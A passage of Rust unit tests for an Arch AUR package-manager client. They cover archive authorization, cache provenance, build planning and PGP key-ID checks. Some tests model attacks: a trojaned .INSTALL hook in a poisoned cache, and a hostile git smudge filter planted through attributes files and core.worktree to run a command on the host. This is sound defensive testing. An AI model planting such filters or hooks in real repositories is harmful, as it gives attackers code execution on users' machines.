                .map(|(name, _)| (*name).to_owned())
                .collect::<Vec<_>>();
            // This is the production final authorization boundary, before install.
            let authorized =
                AurClient::authorize_archives(&paths, &source, "split", &outputs, true);
            if accepted {
                let authorized = authorized?;
                assert_eq!(authorized.len(), requested.len());
                for (snapshot, (name, architecture)) in authorized.iter().zip(requested) {
                    let identity =
                        AurClient::cached_archive_identity(Path::new(&snapshot.handoff()))?
                            .expect("sealed accepted archive must retain its actual metadata");
                    assert_eq!(identity.name, *name);
                    assert_eq!(identity.base, "split");
                    assert_eq!(identity.version, "1.0-1");
                    assert_eq!(identity.architecture.as_deref(), Some(*architecture));
                }
            } else {
                let error =
                    authorized.expect_err("wrong selected-output architecture must be refused");
                assert_eq!(
                    error.to_string(),
                    "AUR archive architecture is not approved for this host"
                );
            }
            // Retained legacy metadata check is cfg(test), not production reuse.
            let cached = AurClient::select_cached_artifacts(
                paths.clone(),
                &outputs,
                source_dir.path(),
                "split",
            );
            if accepted {
                assert_eq!(cached, Some(paths.clone()));
            } else {
                assert_eq!(cached, None);
            }
            assert_eq!(std::fs::read(source_dir.path().join("PKGBUILD"))?, pkgbuild);
            assert_eq!(
                std::fs::read(source_dir.path().join(".SRCINFO"))?,
                srcinfo.as_bytes()
            );
            for (path, before) in paths.iter().zip(archive_before) {
                assert_eq!(std::fs::read(path)?, before);
            }
            Ok(())
        })
    }

    #[test]
    fn split_output_architecture_rejects_sibling_any_for_host_output() -> Result<()> {
        const TEST: &str = "package_managers::aur::client::tests::split_output_architecture_rejects_sibling_any_for_host_output";
        if crate::core::testing::run_isolated_test(TEST)
            || crate::config::Settings::rerun_test_unprivileged(TEST)
        {
            return Ok(());
        }
        let host = super::super::utils::current_arch()
            .expect("supported Arch test host")
            .to_string();
        let srcinfo = format!(
            "pkgbase = split\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = {host}\npkgname = app\npkgname = docs\n\tarch = any\n"
        );
        assert_split_architecture_authorization(&srcinfo, &[("app", &host)], true)?;
        assert_split_architecture_authorization(&srcinfo, &[("app", "any")], false)
    }

    #[test]
    fn split_output_architecture_rejects_base_host_for_any_override() -> Result<()> {
        const TEST: &str = "package_managers::aur::client::tests::split_output_architecture_rejects_base_host_for_any_override";
        if crate::core::testing::run_isolated_test(TEST)
            || crate::config::Settings::rerun_test_unprivileged(TEST)
        {
            return Ok(());
        }
        let host = super::super::utils::current_arch()
            .expect("supported Arch test host")
            .to_string();
        let srcinfo = format!(
            "pkgbase = split\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = {host}\npkgname = app\npkgname = docs\n\tarch = any\n"
        );
        assert_split_architecture_authorization(&srcinfo, &[("docs", "any")], true)?;
        assert_split_architecture_authorization(&srcinfo, &[("docs", &host)], false)
    }

    #[test]
    fn split_output_architecture_rejects_base_any_for_host_override() -> Result<()> {
        const TEST: &str = "package_managers::aur::client::tests::split_output_architecture_rejects_base_any_for_host_override";
        if crate::core::testing::run_isolated_test(TEST)
            || crate::config::Settings::rerun_test_unprivileged(TEST)
        {
            return Ok(());
        }
        let host = super::super::utils::current_arch()
            .expect("supported Arch test host")
            .to_string();
        let srcinfo = format!(
            "pkgbase = split\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = any\npkgname = app\n\tarch = {host}\npkgname = docs\n"
        );
        assert_split_architecture_authorization(&srcinfo, &[("docs", "any")], true)?;
        assert_split_architecture_authorization(&srcinfo, &[("app", &host)], true)?;
        assert_split_architecture_authorization(&srcinfo, &[("app", "any")], false)
    }

    #[test]
    fn split_output_architecture_refuses_whole_pair_with_wrong_second_output() -> Result<()> {
        const TEST: &str = "package_managers::aur::client::tests::split_output_architecture_refuses_whole_pair_with_wrong_second_output";
        if crate::core::testing::run_isolated_test(TEST)
            || crate::config::Settings::rerun_test_unprivileged(TEST)
        {
            return Ok(());
        }
        let host = super::super::utils::current_arch()
            .expect("supported Arch test host")
            .to_string();
        let srcinfo = format!(
            "pkgbase = split\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = {host}\npkgname = app\npkgname = docs\n\tarch = any\n"
        );
        assert_split_architecture_authorization(
            &srcinfo,
            &[("app", &host), ("docs", "any")],
            true,
        )?;
        assert_split_architecture_authorization(&srcinfo, &[("app", &host), ("docs", &host)], false)
    }

    #[test]
    fn cached_architecture_eligibility_matches_sealed_authorization() -> Result<()> {
        let dir = tempfile::tempdir()?;
        let root = dir.path().canonicalize()?;
        let pkg_dir = root.join("fixture");
        std::fs::create_dir(&pkg_dir)?;
        std::fs::write(
            pkg_dir.join("PKGBUILD"),
            b"pkgname=fixture\npkgver=1.0\npkgrel=1\n",
        )?;
        let archive = root.join("fixture.pkg.tar.gz");
        let host_architecture = super::super::utils::current_arch().unwrap().to_string();
        let host = host_architecture.as_str();
        for (declared, actual, expected) in [
            ("any", None, false),
            ("any", Some("any"), true),
            (host, Some(host), true),
            ("foreign-architecture", Some("foreign-architecture"), false),
            ("any", Some(host), false),
            (host, Some("any"), false),
        ] {
            std::fs::write(
                pkg_dir.join(".SRCINFO"),
                format!(
                    "pkgbase = fixture\npkgver = 1.0\npkgrel = 1\narch = {declared}\npkgname = fixture\n"
                ),
            )?;
            let mut pkginfo = "pkgname = fixture\npkgver = 1.0-1\npkgbase = fixture\n".to_string();
            if let Some(architecture) = actual {
                use std::fmt::Write;
                writeln!(pkginfo, "arch = {architecture}")?;
            }
            let buildinfo = format!(
                "format = 2\npkgname = fixture\npkgbase = fixture\npkgver = 1.0-1\npkgarch = {}\n",
                actual.unwrap_or("any")
            );
            write_tar_gz(
                &archive,
                &[
                    (".PKGINFO", pkginfo.as_bytes()),
                    (".BUILDINFO", buildinfo.as_bytes()),
                    (".MTREE", b"#mtree\n"),
                ],
            );
            let outputs = ["fixture".to_string()];
            let cached = AurClient::select_cached_artifacts(
                vec![archive.clone()],
                &outputs,
                &pkg_dir,
                "fixture",
            )
            .is_some();
            let reviewed = ReviewedSource::capture(&pkg_dir)?;
            let authorized = AurClient::authorize_archives(
                std::slice::from_ref(&archive),
                &reviewed,
                "fixture",
                &outputs,
                false,
            );
            assert_eq!(
                authorized.is_ok(),
                expected,
                "final check: {declared:?} / {actual:?}: {authorized:?}"
            );
            assert_eq!(
                cached, expected,
                "cache eligibility: {declared:?} / {actual:?}"
            );
        }
        Ok(())
    }

    #[test]
    fn select_cached_artifact_rejects_mismatched_install_hook() {
        // SEC-R2-01: a poisoned cache with a matching pkgname but a trojaned
        // .INSTALL hook must NEVER be installed from cache; it must fall
        // through to a fresh, reviewed rebuild.
        let dir = tempfile::tempdir().expect("temp dir");
        let pkg_dir = provenance_pkg_dir(
            dir.path(),
            "pkgbase = mypkg\npkgver = 1.0\npkgrel = 1\n\npkgname = mypkg\ninstall = mypkg.install\n",
            Some(("mypkg.install", LEGIT_INSTALL)),
        );
        let poisoned = dir.path().join("mypkg-1.0-1-x86_64.pkg.tar.gz");
        write_pkg_archive(
            &poisoned,
            "pkgname = mypkg\npkgver = 1.0-1\npkgbase = mypkg\n",
            Some(TROJAN_INSTALL),
        );

        assert_eq!(
            AurClient::select_cached_artifacts(
                vec![poisoned],
                &["mypkg".to_string()],
                &pkg_dir,
                "mypkg"
            ),
            None,
            "a cache hit whose .INSTALL hook does not match the reviewed install script must be rejected"
        );
    }

    #[test]
    fn select_cached_artifact_accepts_verified_artifact() {
        let dir = tempfile::tempdir().expect("temp dir");
        let pkg_dir = provenance_pkg_dir(
            dir.path(),
            "pkgbase = mypkg\npkgver = 1.0\npkgrel = 1\n\npkgname = mypkg\ninstall = mypkg.install\n",
            Some(("mypkg.install", LEGIT_INSTALL)),
        );
        let genuine = dir.path().join("mypkg-1.0-1-x86_64.pkg.tar.gz");
        write_pkg_archive(
            &genuine,
            "pkgname = mypkg\npkgver = 1.0-1\npkgbase = mypkg\n",
            Some(LEGIT_INSTALL),
        );

        assert_eq!(
            AurClient::select_cached_artifacts(
                vec![genuine.clone()],
                &["mypkg".to_string()],
                &pkg_dir,
                "mypkg"
            ),
            Some(vec![genuine]),
            "a cache hit whose .PKGINFO and .INSTALL match the reviewed source must be usable"
        );
    }

    #[test]
    fn cached_artifacts_requires_all_split_outputs_to_match_the_checkout() {
        let dir = tempfile::tempdir().expect("temp dir");
        let pkg_dir = provenance_pkg_dir(
            dir.path(),
            "pkgbase = shared\npkgver = 1.0\npkgrel = 1\n\npkgname = app\n\npkgname = libs\n",
            None,
        );
        let mut settings = Settings::default();
        settings.aur.cache_builds = true;
        let client = AurClient {
            build_dir: dir.path().to_path_buf(),
            settings,
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let cache_path = client.cache_path("shared");
        std::fs::create_dir_all(cache_path.parent().unwrap()).unwrap();
        std::fs::write(cache_path, "matching-key").unwrap();
        let write_split_archive = |path: &Path, pkginfo: &str| {
            let pkginfo = format!("arch = any\n{pkginfo}");
            let encoder = zstd::Encoder::new(std::fs::File::create(path).unwrap(), 0).unwrap();
            let mut archive = tar::Builder::new(encoder);
            let mut header = tar::Header::new_gnu();
            header.set_size(pkginfo.len() as u64);
            header.set_cksum();
            archive
                .append_data(&mut header, ".PKGINFO", pkginfo.as_bytes())
                .unwrap();
            archive.into_inner().unwrap().finish().unwrap();
        };
        let app = dir.path().join("app-1.0-1-x86_64.pkg.tar.zst");
        let libs = dir.path().join("libs-1.0-1-x86_64.pkg.tar.zst");
        write_split_archive(&app, "pkgname = app\npkgver = 1.0-1\npkgbase = shared\n");
        write_split_archive(&libs, "pkgname = libs\npkgver = 1.0-1\npkgbase = shared\n");
        let outputs = ["app".to_string(), "libs".to_string()];

        assert_eq!(
            AurClient::cached_artifacts("shared", &outputs, &pkg_dir, dir.path(), "matching-key"),
            None,
        );
        assert!(
            AurClient::select_cached_artifacts(
                vec![libs.clone(), app],
                &outputs,
                &pkg_dir,
                "shared"
            )
            .is_none(),
            "archives must correspond to their requested outputs in order",
        );
        assert!(
            AurClient::select_cached_artifacts(Vec::new(), &[], &pkg_dir, "shared").is_none(),
            "empty outputs must not be treated as a cache hit",
        );

        std::fs::remove_file(&libs).unwrap();
        assert!(
            AurClient::cached_artifacts("shared", &outputs, &pkg_dir, dir.path(), "matching-key")
                .is_none(),
            "a missing split output must reject the whole cached build",
        );
        write_split_archive(&libs, "pkgname = libs\npkgver = 9.9-1\npkgbase = shared\n");
        assert!(
            AurClient::cached_artifacts("shared", &outputs, &pkg_dir, dir.path(), "matching-key")
                .is_none(),
            "a matching hash and filename must not hide one poisoned split output",
        );
    }

    #[test]
    fn select_cached_artifact_rejects_undeclared_install_hook() {
        // No `install=` in the reviewed source: any embedded .INSTALL in the
        // cached artifact is attacker-supplied.
        let dir = tempfile::tempdir().expect("temp dir");
        let pkg_dir = provenance_pkg_dir(
            dir.path(),
            "pkgbase = mypkg\npkgver = 1.0\npkgrel = 1\n\npkgname = mypkg\n",
            None,
        );
        let poisoned = dir.path().join("mypkg-1.0-1-x86_64.pkg.tar.gz");
        write_pkg_archive(
            &poisoned,
            "pkgname = mypkg\npkgver = 1.0-1\npkgbase = mypkg\n",
            Some(TROJAN_INSTALL),
        );

        assert_eq!(
            AurClient::select_cached_artifacts(
                vec![poisoned],
                &["mypkg".to_string()],
                &pkg_dir,
                "mypkg"
            ),
            None,
            "an undeclared .INSTALL hook in a cached artifact must be rejected"
        );
    }

    #[test]
    fn select_cached_artifact_rejects_pkginfo_identity_mismatch() {
        let dir = tempfile::tempdir().expect("temp dir");
        let pkg_dir = provenance_pkg_dir(
            dir.path(),
            "pkgbase = mypkg\npkgver = 1.0\npkgrel = 1\n\npkgname = mypkg\n",
            None,
        );
        let wrong_version = dir.path().join("mypkg-9.9-1-x86_64.pkg.tar.gz");
        write_pkg_archive(
            &wrong_version,
            "pkgname = mypkg\npkgver = 9.9-1\npkgbase = mypkg\n",
            None,
        );
        let wrong_base = dir.path().join("evil-1.0-1-x86_64.pkg.tar.gz");
        write_pkg_archive(
            &wrong_base,
            "pkgname = mypkg\npkgver = 1.0-1\npkgbase = evil\n",
            None,
        );

        assert_eq!(
            AurClient::select_cached_artifacts(
                vec![wrong_version],
                &["mypkg".to_string()],
                &pkg_dir,
                "mypkg"
            ),
            None,
            "a cache hit whose .PKGINFO version differs from the reviewed .SRCINFO must be rejected"
        );
        assert_eq!(
            AurClient::select_cached_artifacts(
                vec![wrong_base],
                &["mypkg".to_string()],
                &pkg_dir,
                "mypkg"
            ),
            None,
            "a cache hit whose .PKGINFO pkgbase differs from the reviewed package base must be rejected"
        );
    }

    #[test]
    fn select_cached_artifact_fails_closed_without_srcinfo() {
        // Missing .SRCINFO means missing proof of provenance: fail closed.
        let dir = tempfile::tempdir().expect("temp dir");
        let pkg_dir = dir.path().join("mypkg");
        std::fs::create_dir(&pkg_dir).expect("pkg dir");
        let archive = dir.path().join("mypkg-1.0-1-x86_64.pkg.tar.gz");
        write_pkg_archive(
            &archive,
            "pkgname = mypkg\npkgver = 1.0-1\npkgbase = mypkg\n",
            None,
        );

        assert_eq!(
            AurClient::select_cached_artifacts(
                vec![archive],
                &["mypkg".to_string()],
                &pkg_dir,
                "mypkg"
            ),
            None,
            "provenance cannot be proven without .SRCINFO; must fail closed"
        );
    }

    #[test]
    fn install_plan_for_one_split_output_installs_only_that_output() {
        // `omg install postgresql18-libs` must build the shared base once but
        // install only the requested output, never its unrequested siblings.
        let response: AurResponse = serde_json::from_str(
            r#"{
                "results": [
                    {
                        "Name": "postgresql18-libs",
                        "Version": "18.4-1",
                        "PackageBase": "postgresql18"
                    },
                    {
                        "Name": "postgresql18",
                        "Version": "18.4-1",
                        "PackageBase": "postgresql18",
                        "Depends": ["postgresql18-libs>=18.4"]
                    }
                ]
            }"#,
        )
        .expect("valid AUR RPC fixture");
        let requested = vec!["postgresql18-libs".to_string()];

        let jobs = AurClient::build_jobs_from_package_info(&requested, &response.results)
            .expect("single-output build plan");

        assert_eq!(jobs.len(), 1);
        assert_eq!(jobs[0].package, "postgresql18");
        assert_eq!(jobs[0].outputs, vec!["postgresql18-libs".to_string()]);
    }

    #[test]
    fn update_build_jobs_include_cross_base_build_dependencies() {
        let response: AurResponse = serde_json::from_str(
            r#"{
                "results": [
                    {
                        "Name": "compiler-git",
                        "Version": "1.0-1",
                        "PackageBase": "compiler-git"
                    },
                    {
                        "Name": "application-git",
                        "Version": "1.0-1",
                        "PackageBase": "application-git",
                        "MakeDepends": ["compiler-git>=1.0"]
                    }
                ]
            }"#,
        )
        .expect("valid AUR RPC fixture");
        let requested = vec!["application-git".to_string(), "compiler-git".to_string()];

        let jobs = AurClient::build_jobs_from_package_info(&requested, &response.results)
            .expect("cross-base build plan");
        let application = jobs
            .iter()
            .find(|job| job.package == "application-git")
            .expect("application job");
        assert_eq!(application.dependencies, ["compiler-git"]);
    }

    #[test]
    fn update_build_jobs_group_split_packages_by_aur_package_base() {
        // AUR RPC v5 reports both PostgreSQL split outputs under one PackageBase.
        // Building the output name directly creates an empty/nonexistent checkout;
        // the shared package base must be built once and both installed outputs selected.
        let response: AurResponse = serde_json::from_str(
            r#"{
                "results": [
                    {
                        "Name": "postgresql18-libs",
                        "Version": "18.4-1",
                        "PackageBase": "postgresql18",
                        "Depends": ["krb5"]
                    },
                    {
                        "Name": "postgresql18",
                        "Version": "18.4-1",
                        "PackageBase": "postgresql18",
                        "Depends": ["postgresql18-libs>=18.4"]
                    }
                ]
            }"#,
        )
        .expect("valid AUR RPC fixture");
        let requested = vec!["postgresql18-libs".to_string(), "postgresql18".to_string()];

        let jobs = AurClient::build_jobs_from_package_info(&requested, &response.results)
            .expect("split-package build plan");

        assert_eq!(jobs.len(), 1);
        assert_eq!(jobs[0].package, "postgresql18");
        assert_eq!(
            jobs[0].outputs,
            vec!["postgresql18".to_string(), "postgresql18-libs".to_string()]
        );
        assert!(jobs[0].dependencies.is_empty());
    }

    #[test]
    fn test_chunk_aur_names_empty() {
        let names: Vec<String> = vec![];
        let chunks = AurClient::chunk_aur_names(&names);
        assert_eq!(chunks.len(), 0, "Empty input should produce zero chunks");
    }

    #[test]
    fn test_chunk_aur_names_single() {
        let names = vec!["firefox".to_string()];
        let chunks = AurClient::chunk_aur_names(&names);
        assert_eq!(chunks.len(), 1, "Single package should produce one chunk");
        assert_eq!(chunks[0].len(), 1);
        assert_eq!(chunks[0][0], "firefox");
    }

    #[test]
    fn test_chunk_aur_names_boundary() {
        let mut names = Vec::new();

        // URL boundary calculation: Each package adds "&arg[]=".len() (7) + name.len()
        // Base: "https://aur.archlinux.org/rpc?v=5&type=info" = 47 chars
        // Available: 4400 - 47 = 4353 chars. With 20-char names: 4353 / 27 ≈ 161 packages/chunk
        for i in 0..200 {
            names.push(format!("package-name-{i:04}"));
        }

        let chunks = AurClient::chunk_aur_names(&names);

        for (idx, chunk) in chunks.iter().enumerate() {
            let mut url_len = AUR_RPC_INFO_BASE_LEN;
            for name in chunk {
                url_len += "&arg[]=".len() + urlencoding::encode(name).len();
            }
            assert!(
                url_len <= AUR_RPC_MAX_URI,
                "Chunk {idx} has URL length {url_len} which exceeds max {AUR_RPC_MAX_URI}"
            );
        }

        let total_packages: usize = chunks.iter().map(Vec::len).sum();
        assert_eq!(
            total_packages, 200,
            "All packages must be included in chunks"
        );
    }

    #[test]
    fn test_chunk_aur_names_long_package_names() {
        let names = vec![
            "a".repeat(100),
            "b".repeat(150),
            "c".repeat(200),
            "short".to_string(),
        ];

        let chunks = AurClient::chunk_aur_names(&names);

        for chunk in &chunks {
            let mut url_len = AUR_RPC_INFO_BASE_LEN;
            for name in chunk {
                url_len += "&arg[]=".len() + urlencoding::encode(name).len();
            }
            assert!(url_len <= AUR_RPC_MAX_URI);
        }

        let total: usize = chunks.iter().map(Vec::len).sum();
        assert_eq!(total, 4);
    }

    #[test]
    fn chunk_aur_names_accounts_for_percent_encoding() {
        let names = (0..220)
            .map(|index| format!("package+variant+{index:04}"))
            .collect::<Vec<_>>();

        let chunks = AurClient::chunk_aur_names(&names);
        assert!(chunks.len() > 1, "encoded request must be split");
        for chunk in chunks {
            let url_len = chunk.iter().fold(AUR_RPC_INFO_BASE_LEN, |length, name| {
                length + "&arg[]=".len() + urlencoding::encode(name).len()
            });
            assert!(url_len <= AUR_RPC_MAX_URI, "wire URI length was {url_len}");
        }
    }

    #[test]
    fn test_chunk_aur_names_exactly_at_boundary() {
        let available = AUR_RPC_MAX_URI - AUR_RPC_INFO_BASE_LEN;

        // Formula: arg_size = "&arg[]=".len() + pkg_name.len() = 7 + 10 = 17 chars/pkg
        let arg_size = "&arg[]=".len() + 10;
        let count = available / arg_size;

        let names: Vec<String> = (0..count).map(|i| format!("pkg{i:06}")).collect();
        let chunks = AurClient::chunk_aur_names(&names);

        assert_eq!(chunks.len(), 1, "Should fit exactly in one chunk");
        assert_eq!(chunks[0].len(), count);
    }

    #[test]
    fn test_has_word_boundary_match_start() {
        assert!(has_word_boundary_match("firefox-bin", "firefox"));
        assert!(has_word_boundary_match("firefox", "firefox"));
    }

    #[test]
    fn test_has_word_boundary_match_after_separator() {
        assert!(has_word_boundary_match("visual-studio-code", "studio"));
        assert!(has_word_boundary_match("lib_test_util", "test"));
        assert!(has_word_boundary_match("package.name", "name"));
    }

    #[test]
    fn test_has_word_boundary_match_no_match_substring() {
        assert!(!has_word_boundary_match("firefox-bin", "irefox"));
        assert!(!has_word_boundary_match("libtest", "test"));
        assert!(!has_word_boundary_match("mypackage", "pack"));
    }

    #[test]
    fn test_has_word_boundary_match_empty() {
        assert!(has_word_boundary_match("firefox", ""));
        assert!(!has_word_boundary_match("", "firefox"));
        assert!(has_word_boundary_match("", ""));
    }

    #[test]
    fn test_has_word_boundary_match_case_sensitive() {
        assert!(has_word_boundary_match("Firefox-Bin", "Firefox"));
        assert!(!has_word_boundary_match("firefox-bin", "Firefox"));
    }

    // ────────────────────────────────────────────────────────────────────────
    // PGP Key ID Validation Tests
    // ────────────────────────────────────────────────────────────────────────

    #[test]
    fn test_pgp_key_id_full_fingerprint() {
        // 40-char fingerprint - most secure
        let fingerprint = "ABCDEF1234567890ABCDEF1234567890ABCDEF12";
        assert_eq!(
            validate_pgp_key_id(fingerprint),
            PgpKeyIdStatus::FullFingerprint
        );
    }

    #[test]
    fn test_pgp_key_id_long_key_id() {
        // 16-char long key ID - acceptable
        let long_id = "ABCDEF1234567890";
        assert_eq!(validate_pgp_key_id(long_id), PgpKeyIdStatus::LongKeyId);
    }

    #[test]
    fn test_pgp_key_id_short_key_id_rejected() {
        // 8-char short key ID - VULNERABLE to collision attacks
        let short_id = "ABCDEF12";
        assert_eq!(validate_pgp_key_id(short_id), PgpKeyIdStatus::ShortKeyId);
    }

    #[test]
    fn test_pgp_key_id_very_short_rejected() {
        // Any ID < 16 chars is treated as short (vulnerable)
        assert_eq!(validate_pgp_key_id("ABCDEF"), PgpKeyIdStatus::ShortKeyId);
        assert_eq!(validate_pgp_key_id("AB"), PgpKeyIdStatus::ShortKeyId);
    }

    #[test]
    fn test_pgp_key_id_empty() {
        assert_eq!(validate_pgp_key_id(""), PgpKeyIdStatus::Empty);
    }

    #[test]
    fn test_pgp_key_id_too_long() {
        // More than 64 chars is invalid
        let too_long = "A".repeat(65);
        assert_eq!(validate_pgp_key_id(&too_long), PgpKeyIdStatus::TooLong);
    }

    #[test]
    fn test_pgp_key_id_boundary_64_chars_is_not_too_long() {
        // Exactly 64 hex chars must pass the length limit and fall through to
        // the non-standard-length classification (not be rejected as TooLong).
        let max_hex = "A".repeat(64);
        assert_eq!(
            validate_pgp_key_id(&max_hex),
            PgpKeyIdStatus::NonStandardLength
        );
    }

    #[test]
    fn test_pgp_key_id_invalid_chars() {
        // Non-hexadecimal characters
        assert_eq!(
            validate_pgp_key_id("GHIJKL1234567890"),
            PgpKeyIdStatus::InvalidChars
        );
        assert_eq!(
            validate_pgp_key_id("ABCDEF12!@#$%^&*"),
            PgpKeyIdStatus::InvalidChars
        );
    }

    #[test]
    fn test_pgp_key_id_non_standard_length() {
        // Valid hex but non-standard length (e.g., 20 chars)
        let non_standard = "ABCDEF1234567890ABCD";
        assert_eq!(
            validate_pgp_key_id(non_standard),
            PgpKeyIdStatus::NonStandardLength
        );
    }

    #[test]
    fn test_pgp_key_id_lowercase_hex() {
        // Lowercase hex should be valid (a-f)
        let lowercase = "abcdef1234567890";
        assert_eq!(validate_pgp_key_id(lowercase), PgpKeyIdStatus::LongKeyId);
    }

    #[test]
    fn test_pgp_key_id_mixed_case() {
        // Mixed case should be valid
        let mixed = "AbCdEf1234567890";
        assert_eq!(validate_pgp_key_id(mixed), PgpKeyIdStatus::LongKeyId);
    }

    #[test]
    fn require_fetchable_pgp_key_id_accepts_long_and_fingerprint() {
        require_fetchable_pgp_key_id("ABCDEF1234567890").expect("long key id");
        require_fetchable_pgp_key_id("ABCDEF1234567890ABCDEF1234567890ABCDEF12")
            .expect("fingerprint");
    }

    #[test]
    fn require_fetchable_pgp_key_id_rejects_short_and_invalid() {
        let short = require_fetchable_pgp_key_id("ABCDEF12")
            .expect_err("short key ids must not be skipped");
        assert!(
            short.to_string().contains("short PGP key ID"),
            "got: {short}"
        );
        let invalid = require_fetchable_pgp_key_id("GHIJKL1234567890")
            .expect_err("non-hex key ids must not be skipped");
        assert!(
            invalid.to_string().contains("non-hex chars"),
            "got: {invalid}"
        );
    }

    #[cfg(feature = "pgp")]
    #[test]
    fn package_scoped_pgp_home_contains_public_keys_without_secret_material() {
        use crate::core::security::keyserver;

        if which::which("gpg").is_err() {
            return;
        }
        let source_home = tempfile::tempdir().unwrap();
        let cache_dir = tempfile::tempdir().unwrap();
        let identity = format!(
            "OMG scoped keyring test {} <test@example.invalid>",
            uuid::Uuid::new_v4()
        );
        let generated = std::process::Command::new("gpg")
            .args([
                "--no-options",
                "--batch",
                "--pinentry-mode",
                "loopback",
                "--passphrase",
                "",
                "--homedir",
            ])
            .arg(source_home.path())
            .args(["--quick-generate-key", &identity, "ed25519", "sign", "1d"])
            .output()
            .unwrap();
        assert!(
            generated.status.success(),
            "{}",
            String::from_utf8_lossy(&generated.stderr)
        );
        let listing = std::process::Command::new("gpg")
            .args([
                "--no-options",
                "--batch",
                "--with-colons",
                "--fingerprint",
                "--homedir",
            ])
            .arg(source_home.path())
            .args(["--list-keys", &identity])
            .output()
            .unwrap();
        let fingerprint = String::from_utf8_lossy(&listing.stdout)
            .lines()
            .find_map(|line| {
                let fields: Vec<_> = line.split(':').collect();
                (fields.first() == Some(&"fpr"))
                    .then(|| fields.get(9).copied())
                    .flatten()
            })
            .expect("generated key fingerprint")
            .to_string();

        let scoped = create_scoped_pgp_home(
            std::slice::from_ref(&fingerprint),
            source_home.path(),
            cache_dir.path(),
        )
        .unwrap();
        assert!(keyserver::is_key_in_gnupg(&fingerprint, scoped.path()).unwrap());
        let secrets = std::process::Command::new("gpg")
            .args(["--no-options", "--batch", "--with-colons", "--homedir"])
            .arg(scoped.path())
            .arg("--list-secret-keys")
            .output()
            .unwrap();
        assert!(
            secrets.status.success(),
            "failed to list package-scoped secret keys: {}",
            String::from_utf8_lossy(&secrets.stderr)
        );
        assert!(
            !String::from_utf8_lossy(&secrets.stdout)
                .lines()
                .any(|line| line.starts_with("sec:")),
            "package-scoped keyrings must not expose the user's secret keys"
        );
    }

    #[tokio::test]
    async fn aur_refresh_discards_tainted_git_configuration_and_dirty_sources() {
        let temp = tempfile::tempdir().unwrap();
        let remote = temp.path().join("remote.git");
        let seed = temp.path().join("seed");
        let checkout = temp.path().join("checkout");

        let git = |args: &[&std::ffi::OsStr]| {
            std::process::Command::new("git")
                .args(args)
                .output()
                .unwrap()
        };
        assert!(
            git(&["init".as_ref(), "--bare".as_ref(), remote.as_os_str()])
                .status
                .success()
        );
        assert!(
            git(&[
                "-C".as_ref(),
                remote.as_os_str(),
                "config".as_ref(),
                "uploadpack.allowFilter".as_ref(),
                "true".as_ref(),
            ])
            .status
            .success()
        );
        assert!(git(&["init".as_ref(), seed.as_os_str()]).status.success());
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "config".as_ref(),
                "user.email".as_ref(),
                "test@example.invalid".as_ref(),
            ])
            .status
            .success()
        );
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "config".as_ref(),
                "user.name".as_ref(),
                "OMG test".as_ref(),
            ])
            .status
            .success()
        );
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "config".as_ref(),
                "commit.gpgsign".as_ref(),
                "false".as_ref(),
            ])
            .status
            .success()
        );
        std::fs::write(seed.join("PKGBUILD"), "pkgver=1\n").unwrap();
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "add".as_ref(),
                "PKGBUILD".as_ref(),
            ])
            .status
            .success()
        );
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "commit".as_ref(),
                "-m".as_ref(),
                "initial".as_ref(),
            ])
            .status
            .success()
        );
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "remote".as_ref(),
                "add".as_ref(),
                "origin".as_ref(),
                remote.as_os_str(),
            ])
            .status
            .success()
        );
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "push".as_ref(),
                "-u".as_ref(),
                "origin".as_ref(),
                "HEAD".as_ref(),
            ])
            .status
            .success()
        );
        assert!(
            git(&["clone".as_ref(), remote.as_os_str(), checkout.as_os_str(),])
                .status
                .success()
        );
        std::fs::write(checkout.join("PKGBUILD"), "pkgver=2\n").unwrap();

        // Taint the checkout the way a sandboxed PKGBUILD can. Each vector
        // reaches Git state that `git clean -fd` never removes, so an in-place
        // refresh would execute the filter on the host.
        let marker = temp.path().join("filter-executed");
        let filter = format!("touch {}; cat", marker.display());
        assert!(
            git(&[
                "-C".as_ref(),
                checkout.as_os_str(),
                "config".as_ref(),
                "filter.hostile.smudge".as_ref(),
                filter.as_ref()
            ])
            .status
            .success()
        );
        // 1. Work-tree attributes (the only vector the previous test covered).
        std::fs::write(checkout.join(".gitattributes"), "* filter=hostile\n").unwrap();
        // 2. Repository-local attributes, which outrank the work tree.
        std::fs::create_dir_all(checkout.join(".git/info")).unwrap();
        std::fs::write(checkout.join(".git/info/attributes"), "* filter=hostile\n").unwrap();
        // 3. A config-selected attributes file outside the work tree.
        let external_attributes = temp.path().join("external-attributes");
        std::fs::write(&external_attributes, "* filter=hostile\n").unwrap();
        assert!(
            git(&[
                "-C".as_ref(),
                checkout.as_os_str(),
                "config".as_ref(),
                "core.attributesFile".as_ref(),
                external_attributes.as_os_str(),
            ])
            .status
            .success()
        );
        // 4. A config-selected working tree pointing outside the checkout.
        let outside = temp.path().join("outside");
        std::fs::create_dir_all(&outside).unwrap();
        std::fs::write(outside.join("precious.txt"), "keep\n").unwrap();
        assert!(
            git(&[
                "-C".as_ref(),
                checkout.as_os_str(),
                "config".as_ref(),
                "core.worktree".as_ref(),
                outside.as_os_str(),
            ])
            .status
            .success()
        );

        let client = AurClient {
            build_dir: temp.path().to_path_buf(),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        client
            .refresh_checkout_from(&checkout, remote.to_str().unwrap())
            .await
            .unwrap();
        assert!(
            !marker.exists(),
            "a tainted checkout must never execute a Git filter on the host"
        );
        assert!(
            outside.join("precious.txt").exists(),
            "a tainted core.worktree must never redirect Git outside the checkout"
        );
        assert!(!checkout.join(".gitattributes").exists());
        assert!(
            !checkout.join(".git/info/attributes").exists(),
            "repository-local attributes must not survive a refresh"
        );
        assert_eq!(
            std::fs::read_to_string(checkout.join("PKGBUILD")).unwrap(),
            "pkgver=1\n",
            "the checkout must be re-cloned from the remote, discarding local edits"
        );
    }

    #[tokio::test]
